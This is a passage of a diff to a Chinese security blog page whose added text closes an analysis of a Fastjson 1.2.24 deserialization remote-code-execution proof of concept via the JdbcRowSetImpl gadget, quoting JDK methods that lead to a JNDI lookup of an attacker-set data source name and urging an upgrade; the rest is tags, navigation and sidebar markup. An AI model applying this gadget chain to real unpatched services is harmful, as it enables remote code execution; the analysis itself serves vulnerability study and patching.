   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>完整的代码已经放到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">PoC调用栈如下</div><div class="line">![3](/images/JdbcRowSetImpl_3.png)</div><div class="line">从这个调用栈就可以看出，在进入Gadget之前，首先是Java应用调用Fastjson的parseObject或者parse接口，进入JavaObjectDeserializer.deserialize方法，经过一系列判断之后发现是JavaBean，就会调用JavaBeanDeserializer.deserialize接口,反序列化得到Gadget相关域，在这个过程中都是通过反射调用这些域的getter，setter或者is方法，这就正式在Gadget执行代码。下面看一下在Gadget中执行的代码。在反序列化过程中是有次序来调用相应接口的，首先是设置dataSourceName属性，这个是其父类BaseRowSet继承过来的。</div><div class="line">```java</div><div class="line">public void setDataSourceName(String name) throws SQLException &#123;</div><div class="line"></div><div class="line">    if (name == null) &#123;</div><div class="line">        dataSource = null;</div><div class="line">    &#125; else if (name.equals(&quot;&quot;)) &#123;</div><div class="line">       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);</div><div class="line">    &#125; else &#123;</div><div class="line">       dataSource = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    URL = null;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>设置autoCommit属性:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这setAutoCommit里函数里会触发connect函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</div><div class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</div><div class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。</p>
+<p>引用：<br>1，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a><br>2,<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
 
       
     </div>
@@ -512,13 +520,15 @@
       
         <div class="post-tags">
           
-            <a href="/tags/浏览器/" rel="tag"># 浏览器</a>
+            <a href="/tags/RCE/" rel="tag"># RCE</a>
           
-            <a href="/tags/crxMouse-Gesture/" rel="tag"># crxMouse Gesture</a>
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
           
-            <a href="/tags/手势插件/" rel="tag"># 手势插件</a>
+            <a href="/tags/PoC/" rel="tag"># PoC</a>
           
-            <a href="/tags/隐私/" rel="tag"># 隐私</a>
+            <a href="/tags/Fastjson/" rel="tag"># Fastjson</a>
+          
+            <a href="/tags/JdbcRowSetImpl/" rel="tag"># JdbcRowSetImpl</a>
           
         </div>
       
@@ -531,8 +541,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/04/01/基于mezzanine的攻防比赛环境搭建及XXE漏洞构造/" rel="next" title="基于mezzanine的攻防比赛环境搭建及XXE漏洞构造">
-                <i class="fa fa-chevron-left"></i> 基于mezzanine的攻防比赛环境搭建及XXE漏洞构造
+              <a href="/2018/10/23/Weblogic CVE-2018-3191分析/" rel="next" title="Weblogic CVE-2018-3191分析">
+                <i class="fa fa-chevron-left"></i> Weblogic CVE-2018-3191分析
               </a>
             
           </div>
@@ -540,10 +550,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/01/PhpWind 利用hash长度扩展攻击修改后台密码getshell/" rel="prev" title="Phpwind利用hash长度扩展攻击修改后台密码getshell">
-                Phpwind利用hash长度扩展攻击修改后台密码getshell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -597,8 +603,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
@@ -696,6 +711,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-使用"><span class="nav-number">1.1.</span> <span class="nav-text">Fastjson 使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson安全特性"><span class="nav-number">1.2.</span> <span class="nav-text">Fastjson安全特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI"><span class="nav-number">1.3.</span> <span class="nav-text">JNDI</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PoC构造与分析"><span class="nav-number">2.</span> <span class="nav-text">PoC构造与分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -834,9 +865,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://xxlegend.com/2016/05/01/小心浏览器插件窃取你的隐私/';
-          this.page.identifier = '2016/05/01/小心浏览器插件窃取你的隐私/';
-          this.page.title = '小心浏览器插件窃取你的隐私';
+          this.page.url = 'http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/';
+          this.page.identifier = '2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/';
+          this.page.title = '基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://xxlegend-com.disqus.com/embed.js';
